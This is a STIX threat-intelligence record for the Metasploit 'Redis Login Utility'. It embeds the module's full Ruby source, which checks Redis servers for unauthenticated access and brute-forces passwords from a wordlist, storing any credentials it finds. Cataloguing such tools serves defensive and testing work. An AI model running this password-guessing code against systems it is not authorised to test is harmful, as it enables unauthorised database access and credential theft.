{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ac8c3883-6dce-4297-a8d7-0b4c310e52d9",
    "created": "2024-08-14T16:27:09.309418Z",
    "modified": "2024-08-14T16:27:09.309422Z",
    "name": "Redis Login Utility",
    "description": "This module attempts to authenticate to an Redis service.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/redis/redis_login.rb",
            "external_id": "redis_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://redis.io/topics/protocol"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/redis'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Redis\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'         => 'Redis Login Utility',\n        'Description'  => 'This module attempts to authenticate to an Redis service.',\n        'Author'       => [ 'Nixawk' ],\n        'References'   => [\n          ['URL', 'https://redis.io/topics/protocol']\n        ],\n        'License'      => MSF_LICENSE))\n\n    register_options(\n      [\n        OptPath.new('PASS_FILE',\n          [\n            false,\n            'The file that contains a list of of probable passwords.',\n            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')\n          ])\n      ])\n\n    # redis does not have an username, there's only password\n    deregister_options(\n      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING',\n      'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASSWORD_SPRAY'\n    )\n  end\n\n  def requires_password?(_ip)\n    connect\n    command_response = send_redis_command('INFO')\n    !(command_response && REDIS_UNAUTHORIZED_RESPONSE !~ command_response)\n  end\n\n  def run_host(ip)\n    unless requires_password?(ip)\n      print_good \"#{peer} - No password is required.\"\n      report_vuln(\n        host: ip,\n        port: rport,\n        proto: 'tcp',\n        sname: 'redis',\n        name: 'Unauthenticated Redis Access',\n        info: \"Module #{fullname} confirmed unauthenticated access to the Redis service\"\n      )\n      return\n    end\n\n    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(\n      blank_passwords: datastore['BLANK_PASSWORDS'],\n      pass_file: datastore['PASS_FILE'],\n      password: datastore['PASSWORD']\n    )\n    cred_collection = prepend_db_passwords(cred_collection)\n\n    scanner = Metasploit::Framework::LoginScanner::Redis.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['PROXIES'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      connection_timeout: 30\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n        module_fullname: self.fullname,\n        workspace_id: myworkspace_id\n      )\n\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        credential_data.delete(:username) # This service uses no username\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        if datastore['VERBOSE']\n          vprint_good \"#{peer} - Login Successful: #{result.credential} (#{result.status}: #{result.proof.strip})\"\n        else\n          print_good \"#{peer} - Login Successful: #{result.credential}\"\n        end\n      when Metasploit::Model::Login::Status::NO_AUTH_REQUIRED\n        vprint_error \"#{peer} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})\"\n        break\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{peer} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof.strip})\"\n      end\n    end\n  end\nend\n"
}